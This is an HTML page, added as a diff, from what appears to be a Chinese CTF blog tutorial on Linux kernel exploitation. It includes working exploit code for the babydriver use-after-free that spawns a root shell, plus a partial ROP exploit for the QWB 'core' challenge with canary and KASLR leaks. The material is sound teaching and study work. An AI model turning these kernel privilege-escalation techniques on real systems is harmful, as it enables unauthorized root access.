@@ -1,0 +1,1740 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Kernel PWN BASIC | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Kernel PWN BASIC | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="前言
+
+介于本人在入门kernel pwn的时候觉得当前trick种类繁多，前置知识也多得吓人，有点不知所措，且有些大佬的博客经常对一些我个人认为比较重要的点一句话带过，导致缺乏经验的我在学习过程中屡屡碰壁。所以我决定用此文章结合一道不错的..." />
+    <meta name="keywords" content="kernel PWN" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Kernel PWN BASIC
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-06-28
+              </span>
+              <span>
+                43 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/7PZkRv00F/" class="post-tag">
+                  # kernel PWN
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<blockquote>
+<p>介于本人在入门kernel pwn的时候觉得当前trick种类繁多，前置知识也多得吓人，有点不知所措，且有些大佬的博客经常对一些我个人认为比较重要的点一句话带过，导致缺乏经验的我在学习过程中屡屡碰壁。所以我决定用此文章结合一道不错的例题尽可能详细的来讲一下kernel pwn从入门过渡到较高难度的部分，供想要学习kernel pwn的小伙伴们参考。</p>
+</blockquote>
+<blockquote>
+<p>在开始看这篇文章之前，我希望小伙伴们已经掌握了kernel pwn一些最基本的操作，例如装好kernel pwn所需要的的前置环境。这一部分内容的优秀教程并不少。</p>
+<p>另外，如果在阅读的过程中发现任何问题，都欢迎来和我交流指正。</p>
+</blockquote>
+<h1 id="basic">BASIC</h1>
+<h2 id="environment">environment</h2>
+<p>在学习kernel pwn之前，需要搭建好很多前置环境</p>
+<ul>
+<li>qemu</li>
+<li>busybox</li>
+<li>编译linux内核（可选）</li>
+</ul>
+<p>至于具体的安装过程并不在本文的讨论范围内，如果还没完成，先自行百度解决</p>
+<h2 id="文件系统">文件系统</h2>
+<p>kernel题一般都会给出一个打包好的文件系统，因此需要掌握常用到的打包/解包命令</p>
+<pre><code class="language-shell">find . | cpio -o --format=newc &gt; ./rootfs.cpio
+cpio -idmv &lt; ./rootfs.cpio
+</code></pre>
+<p>（有时解包出来很奇怪，可能是原始cpio文件其实是以gz格式压缩后的，先gunzip解压一遍）</p>
+<h2 id="cred结构体">cred结构体</h2>
+<p>kernel使用cred结构体记录了进程的权限，如果能劫持或伪造cred结构体，就能改变当前进程的权限。</p>
+<p>原型如下：</p>
+<pre><code class="language-c">struct cred {
+	atomic_t	usage;
+#ifdef CONFIG_DEBUG_CREDENTIALS
+	atomic_t	subscribers;	/* number of processes subscribed */
+	void		*put_addr;
+	unsigned	magic;
+#define CRED_MAGIC	0x43736564
+#define CRED_MAGIC_DEAD	0x44656144
+#endif
+	kuid_t		uid;		/* real UID of the task */
+	kgid_t		gid;		/* real GID of the task */
+	kuid_t		suid;		/* saved UID of the task */
+	kgid_t		sgid;		/* saved GID of the task */
+	kuid_t		euid;		/* effective UID of the task */
+	kgid_t		egid;		/* effective GID of the task */
+	kuid_t		fsuid;		/* UID for VFS ops */
+	kgid_t		fsgid;		/* GID for VFS ops */
+	unsigned	securebits;	/* SUID-less security management */
+	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
+	kernel_cap_t	cap_permitted;	/* caps we're permitted */
+	kernel_cap_t	cap_effective;	/* caps we can actually use */
+	kernel_cap_t	cap_bset;	/* capability bounding set */
+	kernel_cap_t	cap_ambient;	/* Ambient capability set */
+#ifdef CONFIG_KEYS
+	unsigned char	jit_keyring;	/* default keyring to attach requested
+					 * keys to */
+	struct key __rcu *session_keyring; /* keyring inherited over fork */
+	struct key	*process_keyring; /* keyring private to this process */
+	struct key	*thread_keyring; /* keyring private to this thread */
+	struct key	*request_key_auth; /* assumed request_key authority */
+#endif
+#ifdef CONFIG_SECURITY
+	void		*security;	/* subjective LSM security */
+#endif
+	struct user_struct *user;	/* real user ID subscription */
+	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
+	struct rcu_head	rcu;		/* RCU deletion hook */
+} __randomize_layout;
+</code></pre>
+<p>一般而言，我们需要想办法将uid和gid设置为0（root的uid和gid均为0）</p>
+<p>如果能劫持到程序流程，执行以下函数也可以达到相同效果：</p>
+<pre><code class="language-c">commit_creds(prepare_kernel_cred(0));
+commit_creds(init_cred);
+</code></pre>
+<h2 id="内核态函数">内核态函数</h2>
+<p>运行在内核态的函数会和用户态有些许不同</p>
+<p><code>printf</code> -&gt; <code>kprintf</code></p>
+<p><code>memcpy</code> -&gt; <code>copy_to_user / copy_from_user</code></p>
+<p>内核的动态分配并不会采用用户态的glibc，他的堆分配器是SLAB或SLUB。常使用的函数如下：</p>
+<p><code>malloc</code> -&gt; <code>kmalloc</code></p>
+<p><code>free</code> -&gt; <code>kfree</code></p>
+<p>为了安全考虑，内核态也只能运行内核态的函数（smep），想要运行<code>system</code>等函数，必须手动切换回用户态。</p>
+<p>常用的指令是<code>swapgs</code>和<code>iretq</code>（或者<code>swapgs_restore_regs_and_return_to_usermode</code>函数，直接对<code>CR3</code>寄存器的第13位取反来完成切换页表的操作，该函数在KPTI开启的版本中依然有效，而swapgs往往会寄）</p>
+<p>然后需要在栈上存一些上下文：</p>
+<pre><code class="language-c">struct pt_regs {
+
+/* ...................... */
+    
+/* Return frame for iretq */
+	unsigned long ip;
+	unsigned long cs;
+	unsigned long flags;
+	unsigned long sp;
+	unsigned long ss;
+/* top of stack page */
+};
+</code></pre>
+<h2 id="gdb远程调试">gdb远程调试</h2>
+<p>以babydriver这题为例，先使用脚本<code>extract-vmlinux</code>提取出带符号的源码</p>
+<pre><code class="language-shell">./extract-vmlinux ./bzImage &gt; ./vmlinux
+</code></pre>
+<p>(脚本源码: <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux</a>)</p>
+<p>(或者用这个<a href="https://github.com/marin-m/vmlinux-to-elf">https://github.com/marin-m/vmlinux-to-elf</a>)</p>
+<p>在qemu中找到babydriver.ko代码段的起始地址</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/28/2725c5c2e8829.png" alt="1656428815032.png" loading="lazy"></figure>
+<p>启动gdb过后导入符号表</p>
+<pre><code class="language-shell">add-symbol-file ./lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/28/f0eb41e0edef0.png" alt="1656428914178.png" loading="lazy"></figure>
+<p>然后在<code>boot.sh</code>中添加以下参数</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/28/7c7fdaf78e503.png" alt="1656428999671.png" loading="lazy"></figure>
+<p>(直接<code>-s</code>也行)</p>
+<p>重新启动qemu过后，gdb远程连接</p>
+<pre><code class="language-shell">pwndbg&gt; target remote 127.0.0.1:1234
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/28/692a481ba37f4.png" alt="1656429252999.png" loading="lazy"></figure>
+<p>这里给出我常用的一些打包和调试的脚本</p>
+<p><strong>pack.sh</strong></p>
+<pre><code class="language-sh">#!/bin/zsh
+
+gcc \
+	./exp.c \
+	-o exp	\
+	-masm=intel \
+	--static  \
+	-g
+
+chmod 777 ./exp
+
+find . | cpio -o --format=newc &gt; ./rootfs.cpio
+chmod 777 ./rootfs.cpio
+</code></pre>
+<p><strong>gdbinit</strong></p>
+<pre><code class="language-sh">file ./vmlinux
+target remote 127.0.0.1:1234
+c
+</code></pre>
+<h2 id="远程脚本">远程脚本</h2>
+<p>为了减小远程exp的体积，使用musl进行静态编译（<del>再O3优化一下就更小啦</del>）</p>
+<pre><code class="language-python">import sys
+import os
+from pwn import *
+import string
+
+context.log_level='debug'
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa =  lambda x,y : p.sendafter(x,y)
+ru =  lambda x   : p.recvuntil(x)
+
+p = remote('127.0.0.1', 1234)
+
+def send_cmd(cmd):
+	sla('$ ', cmd)
+
+def upload():
+	lg = log.progress('Upload')
+	with open('exp', 'rb') as f:
+		data = f.read()
+	encoded = base64.b64encode(data)
+	encoded = str(encoded)[2:-1]
+	for i in range(0, len(encoded), 300):
+		lg.status('%d / %d' % (i, len(encoded)))
+		send_cmd('echo -n &quot;%s&quot; &gt;&gt; benc' % (encoded[i:i+300]))
+	send_cmd('cat benc | base64 -d &gt; bout')
+	send_cmd('chmod +x bout')
+	lg.success()
+
+os.system('musl-gcc -w -s -static -o3 exp.c -o exp')
+upload()
+
+p.interactive()
+</code></pre>
+<h1 id="attack">ATTACK</h1>
+<h2 id="kernel-uaf">Kernel UAF</h2>
+<h3 id="babydriver">babydriver</h3>
+<h4 id="分析">分析</h4>
+<p>这是ciscn2017年的一道经典kernel pwn入门题。</p>
+<p>解压<code>rootfs.cpio</code>后，在<code>/lib/modules/4.4.72</code>中找到了LKM文件<code>babydriver.ko</code></p>
+<p>checksec只开了nx，且没有去除符号表，很方便调试和分析</p>
+<p>直接丢ida分析</p>
+<pre><code class="language-c">int __fastcall babyrelease(inode *inode, file *filp)
+{
+  _fentry__(inode, filp);
+  kfree(babydev_struct.device_buf);
+  printk(&quot;device release\n&quot;);
+  return 0;
+}
+</code></pre>
+<p>在<code>babyrelease</code>中kfree()之后没有将<code>babydev_struct.device_buf</code>清空，从而导致了uaf漏洞</p>
+<p>而且<code>babydev_struct</code>是一个<code>babydevice_t</code>类型的公共变量，结构如下。</p>
+<pre><code class="language-c">struct babydevice_t
+{
+	char *device_buf;
+	size_t device_buf_len;
+};
+</code></pre>
+<p><code>device_buf</code>是存一个缓冲区的指针，<code>device_buf_len</code>存该缓冲区大小。</p>
+<p>其他的函数都很常规，</p>
+<p><code>babyopen</code>在打开一个设备的时候简单设置了一下<code>babydev_struct</code>的值</p>
+<pre><code class="language-c">int __fastcall babyopen(inode *inode, file *filp)
+{
+  _fentry__(inode, filp);
+  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
+  babydev_struct.device_buf_len = 64LL;
+  printk(&quot;device open\n&quot;);
+  return 0;
+}
+</code></pre>
+<p><code>babywrite</code>和<code>babyread</code>都只检查了一下<code>device_buf</code>指针是否为空和是否越界, 然后对<code>device_buf</code>进行常规的读写</p>
+<pre><code class="language-c">ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
+{
+  size_t v4; // rdx
+  ssize_t result; // rax
+  ssize_t v6; // rbx
+
+  _fentry__(filp, buffer);
+  if ( !babydev_struct.device_buf )
+    return -1LL;
+  result = -2LL;
+  if ( babydev_struct.device_buf_len &gt; v4 )
+  {
+    v6 = v4;
+    copy_from_user();
+    result = v6;
+  }
+  return result;
+}
+</code></pre>
+<pre><code class="language-c">ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
+{
+  size_t v4; // rdx
+  ssize_t result; // rax
+  ssize_t v6; // rbx
+
+  _fentry__(filp, buffer);
+  if ( !babydev_struct.device_buf )
+    return -1LL;
+  result = -2LL;
+  if ( babydev_struct.device_buf_len &gt; v4 )
+  {
+    v6 = v4;
+    copy_to_user(buffer);
+    result = v6;
+  }
+  return result;
+}
+</code></pre>
+<p><code>babyioctl</code>比较有意思，当第二个参数<code>command</code>为<code>0x10001</code>时，可以重新<code>kmalloc</code>一块指定大小的object到<code>babydev_struct.device_buf</code>，从而修改了<code>babydev_struct</code>的<code>device_buf_len</code>为一个新值。</p>
+<pre><code class="language-c">__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
+{
+  size_t v3; // rdx
+  size_t v4; // rbx
+  __int64 result; // rax
+
+  _fentry__(filp, command);
+  v4 = v3;
+  if ( command == 0x10001 )
+  {
+    kfree(babydev_struct.device_buf);
+    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
+    babydev_struct.device_buf_len = v4;
+    printk(&quot;alloc done\n&quot;);
+    result = 0LL;
+  }
+  else
+  {
+    printk(&amp;unk_2EB);
+    result = -22LL;
+  }
+  return result;
+}
+</code></pre>
+<p>至此，利用思路已经非常明显了。</p>
+<p>由于<code>babydev_struct</code>只存在一个，且调用到<code>babyrelease</code>的时候有uaf漏洞，我们可以open两个设备，然后使用<code>babyioctl</code>将<code>babydev_struct.device_buf_len</code>改成<code>cred</code>结构体的大小之后free掉，造成第二个设备存在一个悬挂指针。</p>
+<p>此时再fork()一个新线程，由于kernel的内存分配器采用的是SLUB，之前释放掉的那个和cred结构体相同大小的堆块会直接当成这个线程的cred被申请（<code>kmem_cache_cpu-&gt;freelist</code>是后进先出的，类似于用户态glibc的fastbin，不过object并没有header。另，本题内核版本在<code>4.4.72</code>，cred结构体的分配此时还并没有被隔离到<code>cred_jar</code>中）</p>
+<p>在这个进程中使用babywrite，便可将cred的gid和uid都设置为0</p>
+<p>写好exp过后，由于rootfs.cpio里并没有libc，所以编译的时候要使用静态编译</p>
+<pre><code class="language-shell">gcc exp.c -o exp -static
+</code></pre>
+<p>然后重新打包文件系统，并修改<code>boot.sh</code>中<code>-initrd</code>参数为新打包好的文件系统。</p>
+<p>此时再打开qemu，运行exp过后便可提权成功。</p>
+<p>（由于本做法在高版本不可能适用，且实际意义不大，所以下文将采用一些更&quot;有意思&quot;的做法来提权）</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/06/28/78ad9588092b6.png" alt="1656409433808.png" loading="lazy"></figure>
+<h4 id="exp">exp</h4>
+<pre><code class="language-c">#include&lt;unistd.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;fcntl.h&gt;
+#include&lt;sys/wait.h&gt;
+#include&lt;sys/stat.h&gt;
+int main(){
+	int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);
+	int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);
+
+	ioctl(fd1, 0x10001, 0xa8);
+
+	close(fd1);
+	int id = fork();
+	if(id&lt;0){
+		printf(&quot;fork error!\n&quot;);
+		exit(-1);
+	}
+	else if(id==0){
+		char cred[0x20] = {0};
+		write(fd2, cred, 0x1c);
+		if(getuid()==0){
+			system(&quot;/bin/sh&quot;);
+			exit(0);
+		}
+	}
+	else{
+		wait(NULL);
+	}
+	return 0;
+}
+</code></pre>
+<h2 id="kernel-rop">Kernel ROP</h2>
+<p>本质上和用户态的rop并无区别，只是目标从getshell变成了提权，并且rop结束部分需要引导程序流着陆回用户态</p>
+<h3 id="core">core</h3>
+<h4 id="分析-2">分析</h4>
+<p>题目给出了<code>bzImage</code>, <code>core.cpio</code>, <code>start.sh</code>, <code>vmlinux</code>四个文件。</p>
+<p>先将core.cpio解包</p>
+<p>发现除了常规文件以外，还多了一个<code>gen_cpio.sh</code></p>
+<p>内容如下：</p>
+<pre><code class="language-shell">find . -print0 \
+| cpio --null -ov --format=newc \
+| gzip -9 &gt; $1
+</code></pre>
+<p>这是一个快速打包用的批处理文件。</p>
+<p>看看<code>start.sh</code></p>
+<pre><code class="language-shell">qemu-system-x86_64 \
+-m 64M \
+-kernel ./bzImage \
+-initrd  ./core.cpio \
+-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \
+-s \
+-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
+-nographic  \
+</code></pre>
+<p>开启了kaslr保护，并且用<code>-s</code>为gdb开了端口，所以不需要再<code>-gdb tcp::1234</code>开了。</p>
+<p>不过他设置的64M内存不是很够用，我最终设置到了256M才能启动。</p>
+<p>然后分析<code>init</code></p>
+<pre><code class="language-shell">#!/bin/sh
+mount -t proc proc /proc
+mount -t sysfs sysfs /sys
+mount -t devtmpfs none /dev
+/sbin/mdev -s
+mkdir -p /dev/pts
+mount -vt devpts -o gid=4,mode=620 none /dev/pts
+chmod 666 /dev/ptmx
+cat /proc/kallsyms &gt; /tmp/kallsyms
+echo 1 &gt; /proc/sys/kernel/kptr_restrict
+echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+ifconfig eth0 up
+udhcpc -i eth0
+ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+route add default gw 10.0.2.2
+insmod /core.ko
+
+poweroff -d 120 -f &amp;
+setsid /bin/cttyhack setuidgid 1000 /bin/sh
+echo 'sh end!\n'
+umount /proc
+umount /sys
+
+poweroff -d 0  -f
+</code></pre>
+<p>比较特殊的地方就是将<code>/proc/sys/kernel/kptr_restrict</code>和<code>/proc/sys/kernel/dmesg_restrict</code>的内容设为了<code>1</code>，如此一来，就无法通过<code>dmesg</code>和查看<code>/proc/kallsyms</code>来获取函数地址了。</p>
+<p>好在他前面有一行</p>
+<pre><code class="language-shell">cat /proc/kallsyms &gt; /tmp/kallsyms
+</code></pre>
+<p>将<code>kallsyms</code>备份到了<code>tmp</code>文件夹下。</p>
+<p>然后之后设置了<code>poweroff -d 120 -f</code>，这句比较影响之后的调试，可以直接删掉，或者把时间改长一点。</p>
+<p>我最终修改过后的<code>init</code>文件如下</p>
+<pre><code class="language-sh">mount -t proc proc /proc
+mount -t sysfs sysfs /sys
+mount -t devtmpfs none /dev
+/sbin/mdev -s
+mkdir -p /dev/pts
+mount -vt devpts -o gid=4,mode=620 none /dev/pts
+chmod 666 /dev/ptmx
+cat /proc/kallsyms &gt; /tmp/kallsyms
+echo 1 &gt; /proc/sys/kernel/kptr_restrict
+echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+ifconfig eth0 up
+udhcpc -i eth0
+ifconfig eth0 10.0.2.15 netmask 255.255.255.0
+route add default gw 10.0.2.2
+insmod /core.ko
+chown root:root /flag
+chmod 400 /flag
+cat /sys/module/core/sections/.text &gt; /tmp/info
+
+poweroff -d 1200000 -f &amp;
+setsid /bin/cttyhack setuidgid 1000 /bin/sh
+# setsid /bin/cttyhack setuidgid 0 /bin/sh
+echo 'sh end!\n'
+umount /proc
+umount /sys
+
+poweroff -d 0  -f
+</code></pre>
+<p>将core的.text节地址备份出来是为了方便后续gdb加载symbol文件。</p>
+<p>而且这个<code>/sys/module/core/sections/.text</code>是只有<code>root</code>能读的，直接备份出来比较省事，当然也可以直接修改成<code>root</code>启动。</p>
+<p>此外，为了方便后续打包和调试，我还写了两个批处理文件</p>
+<pre><code class="language-shell">root@ubuntu:/home/kotori/Desktop/core# cat pack.sh
+rm ./core.cpio
+./gen_cpio.sh ./core.cpio
+chmod 777 ./core.cpio
+root@ubuntu:/home/kotori/Desktop/core# cat mkc.sh
+gcc ./exp.c -o exp --static -masm=intel
+chmod 777 ./exp
+sudo ./pack.sh
+</code></pre>
+<p>接下来就是分析<code>core.ko</code>的漏洞了</p>
+<p>checksec发现开启了canary和nx。</p>
+<p><code>init_module()</code>和<code>exit_core()</code>分别注册和注销了<code>/proc/core</code>，<code>core_release()</code>什么都没做，这里对它们不作分析。</p>
+<p><code>core_ioctl</code>中定义了三种操作，分别是调用<code>core_read()</code>，设置全局变量<code>off</code>，调用<code>core_copy_func()</code>。</p>
+<pre><code class="language-c">__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
+{
+  switch ( a2 )
+  {
+    case 0x6677889B:
+      core_read(a3);
+      break;
+    case 0x6677889C:
+      printk(&amp;unk_2CD);
+      off = a3;
+      break;
+    case 0x6677889A:
+      printk(&amp;unk_2B3);
+      core_copy_func(a3);
+      break;
+  }
+  return 0LL;
+}
+</code></pre>
+<p><code>core_read</code>可以将距离<code>rsp</code>偏移为<code>off</code>的值往后拷贝0x40个字节给指定缓冲区。</p>
+<pre><code class="language-c">unsigned __int64 __fastcall core_read(__int64 a1)
+{
+  char *v2; // rdi
+  __int64 i; // rcx
+  unsigned __int64 result; // rax
+  char v5[64]; // [rsp+0h] [rbp-50h] BYREF
+  unsigned __int64 v6; // [rsp+40h] [rbp-10h]
+
+  v6 = __readgsqword(0x28u);
+  printk(&amp;unk_25B);
+  printk(&amp;unk_275);
+  v2 = v5;
+  for ( i = 16LL; i; --i )
+  {
+    *(_DWORD *)v2 = 0;
+    v2 += 4;
+  }
+  strcpy(v5, &quot;Welcome to the QWB CTF challenge.\n&quot;);
+  result = copy_to_user(a1, &amp;v5[off], 64LL);
+  if ( !result )
+    return __readgsqword(0x28u) ^ v6;
+  __asm { swapgs }
+  return result;
+}
+</code></pre>
+<p>这里利用<code>off</code>是可以读出canary的。</p>
+<p><code>core_write</code>是将至多0x800个字节从指定缓冲区复制到<code>name</code>中去。</p>
+<pre><code class="language-c">__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
+{
+  printk(&amp;unk_215);
+  if ( a3 &lt;= 0x800 &amp;&amp; !copy_from_user(&amp;name, a2, a3) )
+    return (unsigned int)a3;
+  printk(&amp;unk_230);
+  return 0xFFFFFFF2LL;
+}
+</code></pre>
+<p>这个<code>core_copy_func</code>则是本题最大的漏洞点。</p>
+<pre><code class="language-c">__int64 __fastcall core_copy_func(__int64 a1)
+{
+  __int64 result; // rax
+  _QWORD v2[10]; // [rsp+0h] [rbp-50h] BYREF
+
+  v2[8] = __readgsqword(0x28u);
+  printk(&amp;unk_215);
+  if ( a1 &gt; 63 )
+  {
+    printk(&amp;unk_2A1);
+    result = 0xFFFFFFFFLL;
+  }
+  else
+  {
+    result = 0LL;
+    qmemcpy(v2, &amp;name, (unsigned __int16)a1);
+  }
+  return result;
+}
+</code></pre>
+<p>当长度参数<code>a1</code>小于等于63时，便可将<code>name</code>中对应字节数的数据复制到栈上变量<code>v2</code>中去，且<code>a1</code>和63作比较时是有符号数，最后调用<code>qmemcpy</code>时转成了<code>unsigned __int16</code>。所以只需要将<code>a1</code>最低两个字节的数据随便设置成一个能装下<code>name</code>的长度，然后其余字节都是<code>0xff</code>就行了。我这里最后构造的<code>a1</code>是<code>0xffffffffffff0100</code>。</p>
+<p>所以整个攻击流程如下：</p>
+<ol>
+<li>设置好<code>off</code>去读出canary的值</li>
+<li>布置好rop之后调用<code>core_write</code>将rop写入<code>name</code>中</li>
+<li>调用<code>core_copy_func</code>，将<code>name</code>的内容写入栈上变量<code>v2</code>中，造成栈溢出，调用<code>commit_creds(prepare_kernel_cred(0))</code>提权。</li>
+</ol>
+<p>当然，在写rop之前，还有一个小小的问题需要解决。那就是解决kaslr和pie带来的偏移问题。</p>
+<p>原始无pie的vmlinux基址是<code>0xffffffff81000000</code></p>
+<p><code>commit_creds</code>的地址是<code>0xffffffff81000000+0x9c8e0</code></p>
+<p><code>prepare_kernel_creds</code>的地址是<code>0xffffffff8109cce0</code></p>
+<p>包括后续找到的gadgets的地址，这些全是no-pie情况下的地址，我们还需要知道真正运行起来的时候与之的偏移。</p>
+<p>这个其实就可以直接在<code>/tmp/kallsyms</code>中，利用他给出的<code>commit_creds</code>或<code>prepare_kernel_cred</code>此时的地址来计算出来。</p>
+<pre><code class="language-c">size_t leak_vmlinux_base(){
+	FILE* fd = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);
+	if(fd==NULL){
+		puts(&quot;[-] open file failed.&quot;);
+		exit(-1);
+	}
+	char buf[0x40] = {0};
+	while(fgets(buf, 0x30, fd)!=NULL){
+		if(strstr(buf, &quot;commit_creds&quot;)){
+			char ptr[0x18] = {0};
+			strncpy(ptr, buf, 0x10);
+			sscanf(ptr, &quot;%lx&quot;, &amp;commit_creds);
+			printf(&quot;[+] commit_creds: 0x%lx\n&quot;, commit_creds);
+			prepare_kernel_cred = commit_creds-0x9c8e0+0x9cce0;
+			fclose(fd);
+			return commit_creds-0x9c8e0;
+		}
+		else if(strstr(buf, &quot;prepare_kernel_cred&quot;)){
+			char ptr[0x18] = {0};
+			strncpy(ptr, buf, 0x10);
+			sscanf(ptr, &quot;%lx&quot;, &amp;prepare_kernel_cred);
+			printf(&quot;[+] prepare_kernel_cred: 0x%lx\n&quot;, prepare_kernel_cred);
+			commit_creds = prepare_kernel_cred-0x9cce0+0x9c8e0;
+			fclose(fd);
+			return prepare_kernel_cred-0x9cce0;
+		}
+	}
+	fclose(fd);
+	return 0;
+}
+</code></pre>
+<p>gadgets的预处理可以用ropper解决（ROPgadget太慢了）</p>
+<pre><code class="language-shell">ropper --file ./vmlinux --nocolor &gt; g
+</code></pre>
+<p>至于rop的构思的话就非常简单了，先摆好rdi为0，然后调用<code>prepare_kernel_cred</code>，此时返回值会在rax中，如果有<code>mov rdi, rax; ret</code>的话将绝杀，可惜没有。</p>
+<p>不过好在有类似的好几个，我选择了<code>mov rdi, rax; jmp rcx;</code></p>
+<p>如果在这之前将rcx摆好<code>commit_creds</code>就很方便了。</p>
+<p>然后切换回用户态，<code>iretq; ret</code>是有的，swapgs就只有<code>swapgs; popfq; ret;</code>，所以后面要跟一个垃圾数据平衡一下栈。</p>
+<p>最后按照rip, cs, rflags, rsp, ss的顺序摆好之前用户态的寄存器就好了。</p>
+<h4 id="exp-2">exp</h4>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;string.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;fcntl.h&gt;
+#include&lt;sys/stat.h&gt;
+#include&lt;sys/types.h&gt;
+#include&lt;sys/ioctl.h&gt;
+size_t u_cs, u_rflags, u_rsp, u_ss;
+size_t commit_creds, prepare_kernel_cred;
+void save_status(){
+	__asm__(&quot;mov u_cs, cs;&quot;
+		&quot;pushf;&quot;
+		&quot;pop u_rflags;&quot;
+		&quot;mov u_rsp, rsp;&quot;
+		&quot;mov u_ss, ss;&quot;
+	);
+}
+void set_off(int fd, int offset){
+	ioctl(fd, 0x6677889c, offset);
+}
+size_t leak_canary(int fd){
+	size_t temp[0x10] = {0};
+	set_off(fd, 0x40);
+	ioctl(fd, 0x6677889b, temp);
+	return temp[0];
+}
+size_t leak_vmlinux_base(){
+	FILE* fd = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);
+	if(fd==NULL){
+		puts(&quot;[-] open file failed.&quot;);
+		exit(-1);
+	}
+	char buf[0x40] = {0};
+	while(fgets(buf, 0x30, fd)!=NULL){
+		if(strstr(buf, &quot;commit_creds&quot;)){
+			char ptr[0x18] = {0};
+			strncpy(ptr, buf, 0x10);
+			sscanf(ptr, &quot;%lx&quot;, &amp;commit_creds);
+			printf(&quot;[+] commit_creds: 0x%lx\n&quot;, commit_creds);
+			prepare_kernel_cred = commit_creds-0x9c8e0+0x9cce0;
+			fclose(fd);
+			return commit_creds-0x9c8e0;
+		}
+		else if(strstr(buf, &quot;prepare_kernel_cred&quot;)){
+			char ptr[0x18] = {0};
+			strncpy(ptr, buf, 0x10);
+			sscanf(ptr, &quot;%lx&quot;, &amp;prepare_kernel_cred);
+			printf(&quot;[+] prepare_kernel_cred: 0x%lx\n&quot;, prepare_kernel_cred);
+			commit_creds = prepare_kernel_cred-0x9cce0+0x9c8e0;
+			fclose(fd);
+			return prepare_kernel_cred-0x9cce0;
+		}
+	}
+	fclose(fd);
+	return 0;
+}
+void get_root_shell(){
+		if(getuid()==0)
+			system(&quot;/bin/sh&quot;);
+		else{
+			puts(&quot;[-] get root shell failed.&quot;);
+			exit(-1);
+		}
+}
+void rop(int fd, size_t canary, size_t offset){
+	size_t name[0x100] = {0};
+	//----gadgets----
+	size_t pop_rdi = 0xffffffff81000b2f; // pop rdi; ret;
+	size_t mov_rdi_rax_jmp_rcx = 0xffffffff811ae978; // mov rdi, rax; jmp rcx;
+	size_t pop_rcx = 0xffffffff81021e53; // pop rcx; ret;
